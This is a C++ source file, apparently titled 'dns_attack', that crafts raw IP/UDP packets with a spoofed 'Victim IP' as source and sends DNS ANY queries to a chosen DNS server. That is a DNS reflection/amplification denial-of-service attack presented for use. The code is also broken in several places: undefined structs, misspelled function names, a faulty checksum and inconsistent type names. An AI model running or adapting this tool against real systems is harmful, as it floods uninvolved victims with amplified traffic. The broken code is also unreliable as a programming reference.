#include <iostream>
#include <cstdlib>
#include <cstring>
#include <ctime>

#include <sys/socket.h>
#include <arpa/inet.h>    // inet_addr
#include <netinet/ip.h>   // Provides declarations for ip header
#include <netinet/udp.h>  // Provides declarations for udp header
using namespace std;

#define DEFAUL_QUERY_NAME "www.google.com"

// Checksum (from internet)
unsigned char checksum(unsigned char *buf, int len){
    unsigned long sum = 0xffff;

    while (len > 1){
        sum += *buf;
        buf++;
        len -= 2;
    }
    if (len == 1) sum += *(unsigned char*) buf;

    sum = (sum & 0xffff) + (sum >> 16);
    sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}

void socket_init(int& sock_r) {
    sock_r = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);

    if (sock_r < 0) {
        cout << "Error on socket init!\n";
        exit(1);
    }
    int one = 1;
    if (setsockopt(sock_r, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        cout << "Fail to Set IP_HDRINCL\n";
        exit(2);
    } else
        cout << "Success to set IP_HDRINCL\n";
}

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

struct dnshdr {
    // short -> 2 byte
    unsigned short id;      // ID
    unsigned short flags;   // DNS Flags

    unsigned short qcnt;    // Question Count
    unsigned short acnt;    // Answer Count

    unsigned short auth;    // Authority RR
    unsigned short add;     // Additional RR
};

struct query {

    unsigned short qtype;
    unsigned short qclass;

};

void construct_dns_hdr(dnshdr* h) {
    h -> id = htons(0x7419);
    h -> flags = htons(0x0100);

    h -> qcnt = htons(1);
    h -> acnt = 0;

    h -> auth = 0;
    h -> add  = 0;
}

void construct_dns_query(unsigned char *qury, unsigned char* host) {
    int poi = 0;
    strcat((char*) host, ".");

    for(int i = 0 ; i < strlen((char*) host); i++) {
        if (host[i] == '.') {
            *qury++ = i - poi;
            for ( ; i > poi; poi++) {
                *qury++ = host[poi];
            }
            poi++;
        }
    }
    *qury++ = 0x00;
}

void construct_ip_hdr(struct iphdr *ip, int tot_len, char* source_ip, sockaddr_in addr) {
    ip -> version  = 4;
    ip -> ihl      = 5;
    ip -> tos      = 0;
    ip -> tot_len  = tot_len;
    ip -> id       = htonl(rand());
    ip -> frag_off = 0;
    ip -> ttl      = 64;
    ip -> protocol = IPPROTO_UDP;
    ip -> check    = 0;
    ip -> saddr    = inet_addr(source_ip);
    ip -> daddr    = addr.sin_addr.s_addr;
}

void construct_udp_hdr(udphdr *u, int udp_len, int source_port) {

    u -> source = htons(source_port);
    u -> dest = htons(53);

    u -> len   = htons(udp_len);
    u -> check = 0;
}

/* Command

$ ./dns_attack <Victim IP> <UDP Source Port> <DNS Server IP>

*/
int main(int argc, char const *argv[]) {
    srand(time(NULL));

    unsigned char dns_data[128];
    dnshdr *dnshdr = (dnshdr*) &dns_data;
    construct_dns_hdr(dnshdr);


    unsigned char *dns_name  = (unsigned char*) &dns_data[sizeof(dnshdr)];
    unsigned char dns_rcrd[32];
    
    strcpy(dns_rcrd, DEFAUL_QUERY_NAME);
    construct_dns_query(dns_name , dns_rcrd);

    query *q;
    q = (query*) &dns_data[sizeof(dnshdr) + (strlen(dns_name) + 1)];
    q -> qtype = htons(0x00ff);
    q -> qclass = htons(0x1);



    // DNS IP setting
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(80);
    addr.sin_addr.s_addr = inet_addr(argv[3]);


    char datagram[4096], source_ip[32], *data, *psgram;

    memset(datagram, 0, 4096);
    strcpy(source_ip, argv[1]);

    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
    memcpy(data, &dns_data, sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query) +1);



    // struct pseudo_header psh;
    struct iphdr  *ip_header  = (struct iphdr* ) (datagram);
    struct udphdr *udp_header = (struct udphdr*) (datagram + sizeof(struct iphdr)); 
	struct dnshdr *dns_header = (struct dnshdr*) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
    
    int hdr_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dnshdr);
    int tot_len = hdr_len + (strlen(dns_name) + 1) + sizeof(query);
    

    construct_ip_hdr(ip_header, tot_len, source_ip, addr);
    ip_header -> check = checksum(((unsigned short *) datagram, ip_header -> tot_len));


    int udp_len = 8 + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
    construct_udp_hdr(udp_header, udp_len, atoi(argv[2]));


    int tmp_len = sizeof(struct udphdr) + sizeof(dnshdr) + (strlen(dns_name) + 1) + sizeof(query);

    struct ps_hdr pshdr;
    pshdr.saddr = inet_addr(argv[1]);
    pshdr.daddr = addr.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(tmp_len);

    int siz = sizeof(ps_hdr) + sizeof(udphdr) + sizeof(dnshdr) + (strlen(dns_name) + 1) + sizeof(query);
    psgram = malloc(siz);

    memcpy(psgram, (char*) &pshdr, sizeof(ps_hdr));
    memcpy(psgram + sizeof(ps_hdr), udp_header, tmp_len);
        
    udp_header -> check = ckecksum((unsigned short*) psgram, siz);

    int sock_r;
    socket_init(sock_r);

    sendto(sock_r, datagram, ip_header -> tot_len, 0, (struct sockaddr*) &addr, sizeof(addr));

    return 0;
}
